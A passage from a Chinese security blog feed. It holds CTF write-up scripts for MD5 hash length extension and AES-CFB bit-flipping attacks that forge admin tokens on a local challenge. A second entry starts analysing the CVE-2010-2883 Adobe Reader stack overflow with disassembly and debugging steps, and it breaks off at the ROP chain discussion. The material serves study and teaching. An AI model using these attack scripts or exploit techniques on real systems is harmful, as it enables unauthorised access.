class="hljs-keyword">print</span> i<br>    <span class="hljs-comment">#secret len = ???</span><br>    find_hash = <span class="hljs-string">“../hash_extender/hash_extender -d ‘;\”tseug\”:5:s’ -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ‘;\”nimda\”:5:s’ –out-data-format=html -l “</span> + str(i) + <span class="hljs-string">“ –quiet”</span><br>    <span class="hljs-comment">#print find_hash</span><br>    calc_res = os.popen(find_hash).readlines()<br>    <span class="hljs-keyword">print</span> calc_res<br>    hash_value = calc_res[<span class="hljs-number">0</span>][:<span class="hljs-number">32</span>]<br>    attack_padding = calc_res[<span class="hljs-number">0</span>][<span class="hljs-number">32</span>:]<br>    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-<span class="hljs-number">1</span>])<br>    ret = gao(attack_padding, hash_value)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">“Welcome”</span> <span class="hljs-keyword">in</span> ret:<br>        <span class="hljs-keyword">print</span> ret<br>        <span class="hljs-keyword">break</span><br><br><br></code></pre><br><h3 id="方法二-利用上述脚本">方法二 利用上述脚本</h3><br><p>只需简单的更改第二个脚本就好</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -<em>- coding: utf-8 -</em>-</span><br><span class="hljs-comment"># @Author：DshtAnger</span><br><span class="hljs-keyword">import</span> test1<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long<br><span class="hljs-comment">#reference:</span><br><span class="hljs-comment">#   <a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/69264.html</a></span><br><span class="hljs-comment">#problem link:</span><br><span class="hljs-comment">#   <a href="http://ctf4.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">http://ctf4.shiyanbar.com/web/kzhan.php</a></span><br>samplehash=<span class="hljs-string">“3a4727d57463f122833d9e732f94e4e0”</span><br><br><span class="hljs-string">‘’’<br>res = re.findall(‘.{8}’,samplehash)<br>print res<br><br>s = ‘03194d72’<br>print c<br>s1 = “”<br>print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])<br>‘’’</span><br>s =[]<br>res = re.findall(<span class="hljs-string">‘.{8}’</span>,samplehash)<br><span class="hljs-keyword">print</span> res<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    ss = <span class="hljs-string">“”</span><br><br>    ss = ss.join([i[j-<span class="hljs-number">2</span>]+i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(len(i),<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>)])<br><br>    s.append(bytes_to_long(binascii.a2b_hex(ss)))<br><span class="hljs-keyword">print</span> [hex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]<br><span class="hljs-comment"># 084e0343 a0486ff0 5530df6c 705c8bb4</span><br><span class="hljs-comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span><br><br>s1=s[<span class="hljs-number">0</span>]<br>s2=s[<span class="hljs-number">1</span>]<br>s3=s[<span class="hljs-number">2</span>]<br>s4=s[<span class="hljs-number">3</span>]<br><span class="hljs-comment">#exp</span><br><br>secret_admin=<span class="hljs-string">‘xxxxxxxxxxxx;”tseug”:5:s’</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span><em><span class="hljs-number">31</span>+<span class="hljs-string">‘\x18’</span>+<span class="hljs-string">‘\x00’</span></em><span class="hljs-number">7</span>+<span class="hljs-string">‘;”nimda”:5:s’</span><br>r = test1.deal_rawInputMsg(secret_admin)<br>inp = r[len(r)/<span class="hljs-number">2</span>:]      <span class="hljs-comment">#我们需要截断的地方，也是我们需要控制的地方</span><br><span class="hljs-comment">#print r;”tseug”:5:s</span><br><span class="hljs-comment">#print inp</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+test1.run_md5(s1,s2,s3,s4,inp)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+hashlib.md5(secret_admin).hexdigest()</code></pre><br><p>代码中的xxxxx就是salt 但是首先我们要猜测长度 所以可以利用脚本写一个简单的爆破</p><br><h2 id="0x3-admin">0x3 admin</h2><br><p>这道题目也是不错的考察了，hash扩展攻击技巧以及aes的相关加密方式</p><br><p>题目我已经上传到github上面了<a href="https://github.com/actionyz/Web/tree/master/web%E5%AF%86%E7%A0%81%EF%BC%88hash%20extend%20aes%20cfb%E5%8A%A0%E5%AF%86%EF%BC%89" target="_blank" rel="external">链接</a></p><br><p>主要还是代码审计</p><br><h3 id="step-1-初步审计">step 1 初步审计</h3><br><ol><br><li>访问backup_old.php会生成flag的加密内容</li><br><li>index.php提供注册登录解密等功能</li><br><li>要想实现解密必须是的admin的值为1</li><br></ol><br><h3 id="step-2-直接解密解法一">step 2 直接解密(解法一)</h3><br><p>这里需要注意一下aes加密解密，是要16字节填充的。所以要控制一下用户名长度</p><br><p>我们注册 <br><br><code>username = xxxxxxxadmin|1|501530457b49501056d8f994d12252ca</code> <br><br>就会得到加密的内容我们取前96位，因为明文已知所以最后一位字节翻转<br><br></p><br><pre class="prettyprint"><code class=" hljs perl">import binascii<br><span class="hljs-keyword">s</span> = <span class="hljs-string">‘7bbb9e011044a910a7c78694894637b75baf41106081282d35d171253cadcbbf24498a58a9ac5e5bdba9ed1c3f3badf6e5844ea87f28680454a847808321da8ce581b67e0c24bc6cab79cf8c9ce16074ae8a01456f3921f8a4bd654ceaf9da51’</span><br>string = <span class="hljs-keyword">s</span>[<span class="hljs-number">0</span>:<span class="hljs-number">96</span>]<br>last_8 = binascii.a2b_hex(string[-<span class="hljs-number">2</span>:])<br><span class="hljs-keyword">print</span> len(last_8)<br>plain = <span class="hljs-string">‘|’</span><br>mid = <span class="hljs-string">‘’</span>.<span class="hljs-keyword">join</span>([<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(last_8[i])^<span class="hljs-keyword">ord</span>(plain[i])) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>)])<br>final = <span class="hljs-string">‘’</span>.<span class="hljs-keyword">join</span>([<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(mid[i])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘\x01’</span>)) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>)])<br><span class="hljs-keyword">print</span> string[:-<span class="hljs-number">2</span>]+binascii.b2a_hex(final)<br></code></pre><br><p>将<code>token=</code> <br><br><code>login=501530457b49501056d8f994d12252ca</code><br></p><br><h3 id="step-3-利用hash拓展攻击没有必要">step 3 利用hash拓展攻击（没有必要）</h3><br><p>贴上脚本，hash生成还是以前的脚本</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br>url_register = <span class="hljs-string">‘<a href="http://127.0.0.1/var/index.php?action=register" target="_blank" rel="external">http://127.0.0.1/var/index.php?action=register</a>‘</span><br>url_login = <span class="hljs-string">‘<a href="http://127.0.0.1/var/index.php?action=login" target="_blank" rel="external">http://127.0.0.1/var/index.php?action=login</a>‘</span><br>url_manage = <span class="hljs-string">‘<a href="http://127.0.0.1/var/index.php?action=manage" target="_blank" rel="external">http://127.0.0.1/var/index.php?action=manage</a>‘</span><br>url_back = <span class="hljs-string">‘<a href="http://127.0.0.1/var/backup_old.php" target="_blank" rel="external">http://127.0.0.1/var/backup_old.php</a>‘</span><br>re1 = requests.session()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">(name,passwd)</span>:</span><br>    data = {<br>    <span class="hljs-string">‘user’</span>:name,<br>    <span class="hljs-string">‘pwd’</span>:passwd<br>    }<br>    re1.post(url_register,data=data)<br><br><span class="hljs-comment"># login(‘kk’,’kk’)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">(name,passwd)</span>:</span><br>    data = {<br>    <span class="hljs-string">‘user’</span>:name,<br>    <span class="hljs-string">‘pwd’</span>:passwd<br>    }<br>    s = re1.post(url_login,data=data,allow_redirects=<span class="hljs-keyword">False</span>)<br>    <span class="hljs-comment"># print s.content</span><br>    <span class="hljs-keyword">return</span>  s.cookies<br><br>token_fl = <span class="hljs-string">‘’</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span><span class="hljs-params">(token,sign)</span>:</span><br>    <span class="hljs-keyword">global</span> token_fl<br><br>    cookies ={<br>    <span class="hljs-string">‘sign’</span>:sign,<br>    <span class="hljs-string">‘token’</span>:token,<br>    }<br><br>    s = re1.post(url_manage,data={<span class="hljs-string">‘do’</span>:<span class="hljs-string">‘decrypt’</span>},cookies=cookies)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">‘Password’</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s.content:<br>        token_fl = token<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(token,sign)</span>:</span><br>    re1.post(url_back)<br>    srand = int(time.time())<br>    r = re1.post(<span class="hljs-string">‘<a href="http://127.0.0.1/var/backup.txt" target="_blank" rel="external">http://127.0.0.1/var/backup.txt</a>‘</span>)<br>    encrypt = r.content<br>    r = re1.post(<span class="hljs-string">‘<a href="http://127.0.0.1/2.php" target="_blank" rel="external">http://127.0.0.1/2.php</a>‘</span>,data={<span class="hljs-string">‘a’</span>:srand})<br>    st = r.content<br>    string = <span class="hljs-string">‘’</span>.join([hex(ord(i))[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> st])<br>    <span class="hljs-keyword">print</span> st,string<br>    cookies ={<br>    <span class="hljs-string">‘sign’</span>:sign,<br>    <span class="hljs-string">‘token’</span>:token,<br>    }<br>    s = re1.post(url_manage,data={<span class="hljs-string">‘do’</span>:<span class="hljs-string">‘decrypt’</span>,<span class="hljs-string">‘iv’</span>:string,<span class="hljs-string">‘text’</span>:encrypt},cookies=cookies)<br>    <span class="hljs-keyword">print</span> s.content<br>    r = re.findall(<span class="hljs-string">‘(.{32,32})&lt;br /&gt;’</span>,s.content)<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">‘’</span>.join([chr(int(<span class="hljs-string">‘0x’</span>+r[<span class="hljs-number">0</span>][i]+r[<span class="hljs-number">0</span>][i+<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(r[<span class="hljs-number">0</span>]),<span class="hljs-number">2</span>)])<br><br>hash_ex = <span class="hljs-string">‘e825bd41831d87fa7e8b84b5e6614ce5’</span><br>name = <span class="hljs-string">‘admin’</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span><em><span class="hljs-number">40</span>+<span class="hljs-string">‘\x78’</span>+<span class="hljs-string">‘\x00’</span></em><span class="hljs-number">7</span>+<span class="hljs-string">‘tadmin’</span>+<span class="hljs-string">‘|1|’</span>+hash_ex<br><br><br>passwd = <span class="hljs-string">‘33’</span><br><span class="hljs-comment"># register(name,passwd)</span><br>rs = login(name,passwd)<br><span class="hljs-keyword">print</span> rs[<span class="hljs-string">‘sign’</span>],len(rs[<span class="hljs-string">‘token’</span>][:<span class="hljs-number">190</span>])<br><span class="hljs-comment"># print rs[‘token’][:190]</span><br>dic = []<br>s = <span class="hljs-string">‘0987654321abcdef’</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>        dic.append(i+j)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>    attack(rs[<span class="hljs-string">‘token’</span>][:<span class="hljs-number">190</span>]+i,hash_ex)<br><br><span class="hljs-comment"># print token_fl</span><br>test(token_fl,hash_ex)</code></pre></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x00 MD5加密原理0x1 字节填充0x2 分组加密0x3 实例演示0x01 攻击原理0x02 攻击脚本0x1 md5 python 实现0x2 计算脚本0x03 实例演示0x1 简单实例0x2 jarvisoj flag在管理员手里方法一 利用hash_extender方法二 利用上述脚本0x3 adminstep 1 初步审计step 2 直接解密解法一ste&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB漏洞" scheme="http://yoursite.com/tags/WEB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>漏洞分析之CVE-2010-2883（栈溢出）</title>
    <link href="http://yoursite.com/2017/07/02/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BCVE-2010-2883%EF%BC%88%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%89/"/>
    <id>http://yoursite.com/2017/07/02/漏洞分析之CVE-2010-2883（栈溢出）/</id>
    <published>2017-07-02T02:55:00.000Z</published>
    <updated>2017-10-22T02:14:24.615Z</updated>
    
    <content type="html"><![CDATA[<p>Adobe Acrobat和Reader都是美国Adobe公司开发的非常流行的PDF文件阅读器。        基于Window和Mac OS X的Adobe Reader和Acrobat 9.4之前的9.x版本，8.2.5之前的8.x版本的CoolType.dll中存在基于栈的缓冲区溢出漏洞。远程攻击者可借助带有TTF字体Smart INdependent Glyphlets (SING)表格中超长字段的PDF文<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p><div class="toc"><div class="toc"><br><ul><br><li><a href="#0x00-漏洞简介">0x00 漏洞简介</a></li><br><li><a href="#0x01-测试环境">0x01 测试环境</a></li><br><li><a href="#0x02-漏洞调试">0x02 漏洞调试</a><ul><br><li><a href="#0x1-基于字符串定位的漏洞分析方法">0x1 基于字符串定位的漏洞分析方法</a></li><br><li><a href="#0x2-sing数据结构分析">0x2 SING数据结构分析</a></li><br><li><a href="#0x3-ollydbg动态调试">0x3 Ollydbg动态调试</a><ul><br><li><a href="#恶意数据跟踪调试">恶意数据跟踪调试</a></li><br><li><a href="#rop链构造">ROP链构造</a></li><br></ul><br></li><br><li><a href="#0x4-heap-spray技术应用">0x4 heap spray技术应用</a></li><br></ul><br></li><br><li><a href="#0x03-漏洞验证">0x03 漏洞验证</a></li><br></ul><br></div><br></div><br></p><br><blockquote><br><p>之前调过一个关于浏览器的漏洞，因为第一次接触漏洞，所以很没有经验不知道最后怎么构造shellcode（特别是ROP链的写法），有幸再调试一个稍微简单点的CVE，具体查看poc中的ROP链编写。</p><br></blockquote><br><h1 id="0x00-漏洞简介">0x00 漏洞简介</h1><br><p>Adobe Acrobat和Reader都是美国Adobe公司开发的非常流行的PDF文件阅读器。 <br><br>        基于Window和Mac OS X的Adobe Reader和Acrobat 9.4之前的9.x版本，8.2.5之前的8.x版本的CoolType.dll中存在基于栈的缓冲区溢出漏洞。远程攻击者可借助带有TTF字体Smart INdependent Glyphlets (SING)表格中超长字段的PDF文件执行任意代码或者导致拒绝服务（应用程序崩溃）。<br></p><br><h1 id="0x01-测试环境">0x01 测试环境</h1><br><table><br><thead><br><tr><br><th>虚拟机</th><br><th>winxp sp3 32bit</th><br></tr><br></thead><br><tbody><tr><br><td>adobe Reader</td><br><td>9.3.4</td><br></tr><br></tbody></table><br><p>利用OD以及IDA进行动静态结合的逆向分析</p><br><h1 id="0x02-漏洞调试">0x02 漏洞调试</h1><br><h2 id="0x1-基于字符串定位的漏洞分析方法">0x1 基于字符串定位的漏洞分析方法</h2><br><p>首先进行漏洞定位，这是分析的起始步骤，找到漏洞产生的现场，作为一个典型的stack overflow的漏洞，最典型的函数就是Strcat函数，同时本漏洞出现的原因是在堆SING表格的解析上，所以我们可以直接利用IDA分析（CoolType.dll文件）定位漏洞所在位置，alt+t搜索SING字符 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702094429872?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>利用IDA静态查看出问题的CoolType.dll动态链接库<br><br></p><br><pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DCF9                 <span class="hljs-keyword">push</span>    ebp<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DCFA                 <span class="hljs-keyword">sub</span>     esp, <span class="hljs-number">104</span>h；分配栈空间<span class="hljs-number">0x104</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD00                 lea     ebp, [esp-<span class="hljs-number">4</span>]；后面的strcat会把执行结果保存在ebp中<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD04                 <span class="hljs-keyword">mov</span>     eax, dword_8230FB8<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD09                 xor     eax, ebp<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD0B                 <span class="hljs-keyword">mov</span>     [ebp+<span class="hljs-number">104</span>h], eax<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD11                 <span class="hljs-keyword">push</span>    <span class="hljs-number">4</span>Ch<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD13                 <span class="hljs-keyword">mov</span>     eax, offset loc_8184A54<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD18                 <span class="hljs-keyword">call</span>    __EH_prolog3_catch<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD1D                 <span class="hljs-keyword">mov</span>     eax, [ebp+arg_C]<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD23                 <span class="hljs-keyword">mov</span>     edi, [ebp+arg_0]<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD29                 <span class="hljs-keyword">mov</span>     ebx, [ebp+arg_4]<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD2F                 <span class="hljs-keyword">mov</span>     [ebp+var_28], edi<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD32                 <span class="hljs-keyword">mov</span>     [ebp+var_30], eax<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD35                 <span class="hljs-keyword">call</span>    sub_804172C<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD3A                 xor     esi, esi<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD3C                 cmp     dword ptr [edi+<span class="hljs-number">8</span>], <span class="hljs-number">3</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD40                 <span class="hljs-keyword">mov</span>     [ebp+var_4], esi<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD43                 jz      loc_803DF00<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD49                 <span class="hljs-keyword">mov</span>     [ebp+var_1C], esi<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD4C                 <span class="hljs-keyword">mov</span>     [ebp+var_18], esi<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD4F                 cmp     dword ptr [edi+<span class="hljs-number">0</span>Ch], <span class="hljs-number">1</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD53                 <span class="hljs-keyword">mov</span>     byte ptr [ebp+var_4], <span class="hljs-number">1</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD57                 jnz     loc_803DEA9<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD5D                 <span class="hljs-keyword">push</span>    offset aName    <span class="hljs-comment">; “name”</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD62                 <span class="hljs-keyword">push</span>    edi             <span class="hljs-comment">; int</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD63                 lea     ecx, [ebp+var_1C]<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD66                 <span class="hljs-keyword">mov</span>     [ebp+var_11], <span class="hljs-number">0</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD6A                 <span class="hljs-keyword">call</span>    sub_80217D7<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD6F                 cmp     [ebp+var_1C], esi<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD72                 jnz     short loc_803DDDD<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD74                 <span class="hljs-keyword">push</span>    offset aSing    <span class="hljs-comment">; “SING”</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD79                 <span class="hljs-keyword">push</span>    edi             <span class="hljs-comment">; int</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD7A                 lea     ecx, [ebp+var_24]；一个指向虚表的指针<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD7D                 <span class="hljs-keyword">call</span>    sub_8021B06；处理SING表<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD82                 <span class="hljs-keyword">mov</span>     eax, [ebp+var_24]<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD85                 cmp     eax, esi；判断是否为空<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD87                 <span class="hljs-keyword">mov</span>     byte ptr [ebp+var_4], <span class="hljs-number">2</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD8B                 jz      short loc_803DDC4；这里不跳转<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD8D                 <span class="hljs-keyword">mov</span>     ecx, [eax]；字体资源版本号，这里是<span class="hljs-number">1.0</span>版本<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD8F                 <span class="hljs-keyword">and</span>     ecx, <span class="hljs-number">0</span>FFFFh<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD95                 jz      short loc_803DD9F；这里跳转<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD97                 cmp     ecx, <span class="hljs-number">100</span>h<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD9D                 jnz     short loc_803DDC0<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD9F<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD9F loc_803DD9F:                            <span class="hljs-comment">; CODE XREF: sub_803DCF9+9Cj</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DD9F                 <span class="hljs-keyword">add</span>     eax, <span class="hljs-number">10</span>h；寻找uniqueName，相对sing表入口偏移<span class="hljs-number">0x10</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDA2                 <span class="hljs-keyword">push</span>    eax             <span class="hljs-comment">; Source</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDA3                 lea     eax, [ebp+<span class="hljs-number">0</span>]；前面提到的申请的变量空间<br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDA6                 <span class="hljs-keyword">push</span>    eax             <span class="hljs-comment">; Dest</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDA7                 <span class="hljs-keyword">mov</span>     byte ptr [ebp+<span class="hljs-number">0</span>], <span class="hljs-number">0</span><br><span class="hljs-label">.text:</span><span class="hljs-number">0803</span>DDAB                 <span class="hljs-keyword">call</span>    strcat；最后产生溢出的漏洞点<br></code></pre><br><p>由上述汇编代码来看，漏洞产生的根本原因是在copy字符串时没有对字符创的长度进行检测，导致恶意数据覆盖返回地址，造成栈溢出。</p><br><h2 id="0x2-sing数据结构分析">0x2 SING数据结构分析</h2><br><p>这里介绍一款PDF二进制分析工具 PdfStreamDumper，用工具导入利用漏洞的PDF文件，在Object中找到Sing的Object，右键选择Save Decompressed Streams保存到本地。在保存的文件中能看到TableEntry数据结构</p><br><pre class="prettyprint"><code class=" hljs d"><span class="hljs-keyword">typedef</span> sturct_SING<br>{<br>    <span class="hljs-built_in">char</span> tag[<span class="hljs-number">4</span>];<span class="hljs-comment">//“SING”</span><br>    ULONG checkSum;<span class="hljs-comment">//校验和</span><br>    ULONG offset;<span class="hljs-comment">//相对文件偏移</span><br>    ULONG length;<span class="hljs-comment">//数据长度</span><br>} TableEntry;</code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702100520347?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>根据TableEntry结构可知从SING入口偏移0x11c为SING真实数据，从书上知道了SING从真实数据偏移0x10为uniqueName域，从代码上可以看出strcat是将uniqueName复制到栈空间，直至遇到NULL字符串终止符。 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702100609200?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><h2 id="0x3-ollydbg动态调试">0x3 Ollydbg动态调试</h2><br><ol><br><li>打开Adobe Reader,OD附加,f9</li><br><li>ctrl+g:803DD9F,f2</li><br><li>Adobe Reader中打开msf.pdf</li><br><li>OD中断到803DD9F处</li><br></ol><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702101532193?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>这段汇编将已经在内存里的uniqueName域copy至程序所运行的栈中，查看相关内存已经找到了SING中的数据 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702104902228?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702103120552?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>从第一个4byte到最后一个覆盖的地址，可以发现有0x328-0x12C=0x1FC byte <br><br>一直执行到83DDAB，造成缓冲区溢出 <br><br>溢出修改了一个虚表的指针使得指指向你精心构造的ROP链<br><br><br><br><br><br></p><br><p>这里为了方便调试将刚刚写入占中的地址全部设上访问中断 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702110521062?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>这样以来就可以在接下来对刚刚复制的恶意数据进行跟踪，调试。<br><br></p><br><h3 id="恶意数据跟踪调试">恶意数据跟踪调试</h3><br><p>这里取了第一个字节 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702125605113?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><hr><br><p>这里循环取出 在栈里面的恶意数据 注意这里取出的是4byte <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702125814385?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><hr><br><p>将栈上的数据复制到0x491274 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702130432817?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><hr><br><p>内存访问断点断在了 一个将0x495220c写入0x12e608内存处 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702130752574?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><hr><br><p>到这里才到关键点，有一个调用虚表的指令，一开始虚表是存在栈上的，但是被我们溢出覆盖成了恶意地址 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170702131305256?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><h3 id="rop链构造">ROP链构造</h3><br><p>因为软件本身自带DEP数据保护，所以这里我们需要构造DEP链来绕过它，构造ROP链的过程很巧妙。大体绕过DEP的思路如下：</p><br><ol><br><li>利用heap 